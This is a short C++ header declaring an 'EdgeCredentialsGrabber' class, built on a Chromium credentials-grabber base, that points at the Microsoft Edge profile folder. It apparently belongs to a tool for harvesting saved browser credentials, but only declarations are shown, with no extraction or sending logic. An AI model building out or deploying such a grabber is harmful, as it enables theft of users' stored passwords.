#pragma once
#include "ChromiumCredentialsGrabber.hpp"

class EdgeCredentialsGrabber final : public ChromiumCredentialsGrabber
{
public:
	explicit EdgeCredentialsGrabber();
	~EdgeCredentialsGrabber() override = default;
	EdgeCredentialsGrabber(const EdgeCredentialsGrabber&) = delete;
	EdgeCredentialsGrabber& operator=(const EdgeCredentialsGrabber&) = delete;
	EdgeCredentialsGrabber(EdgeCredentialsGrabber&&) = delete;
	EdgeCredentialsGrabber& operator=(EdgeCredentialsGrabber&&) = delete;

private:
	static constexpr auto EDGE_ROOT_FOLDER = L"%LOCALAPPDATA%/Microsoft/Edge/";

	[[nodiscard]] static std::filesystem::path get_local_edge_path();

public:
	[[nodiscard]] std::wstring source() const override;
};
